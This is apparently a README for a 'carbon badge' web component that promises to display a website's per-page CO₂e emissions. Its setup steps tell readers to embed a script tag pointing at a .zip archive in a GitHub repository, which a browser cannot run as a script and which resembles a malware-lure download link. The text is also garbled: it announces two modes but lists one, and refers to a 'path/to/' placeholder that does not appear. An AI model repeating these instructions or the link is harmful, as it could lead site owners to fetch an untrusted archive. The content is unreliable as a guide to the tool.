## 🌱 What Is CometWeb-Carbon_Badge?

CometWeb-Carbon_Badge is a small tool that helps you show how much carbon dioxide (CO₂e) your website creates for each page view. It is a lightweight component you can add to your website. It uses trusted data models from CometWeb and the Sustainable Web Design Model version 4.

This badge lets visitors see your site's carbon footprint in real time. It works with two main methods:  
- **API mode:** Connects online to get precise carbon data.

You can add the badge easily and it fits well into any website. This tool supports efforts to make the web more eco-friendly by sharing your site's environmental impact clearly.

## 🚀 How to Use CometWeb-Carbon_Badge on Your Website

You do not need to be a programmer to add this badge. Follow these simple steps:

### 1. Prepare your website

Make sure you can edit the HTML code of the pages where you want to show the badge. Usually, you can do this through your website’s content management system (CMS) or by accessing the site files directly.

### 2. Copy the badge code

Inside the downloaded package, you will find a small code snippet. This snippet includes a line of HTML that looks like this:

```html
<cometweb-carbon-badge mode="api"></cometweb-carbon-badge>
```

- The **mode** attribute can be set to `"api"` for live data or `"estimate"` for offline calculation.

### 3. Insert the code on your website

- Open the HTML file or editor where you want the badge to appear.
- Paste the copied snippet where you want the badge to show up—usually in the footer or header area so it appears on all pages.
- Save your changes.

### 4. Load the web component script

To make the badge work, you need to add a small JavaScript file reference in your website's `<head>` or before the closing `</body>` tag. This file makes the badge function properly.

The script source will look like this (the exact file path depends on your download):

```html
<script src="https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip"></script>
```

Replace `"path/to/"` with the actual folder where you saved the files on your web server.

### 5. View your page

Open your website in a browser. The badge should now show the carbon emissions per page view based on your chosen mode.
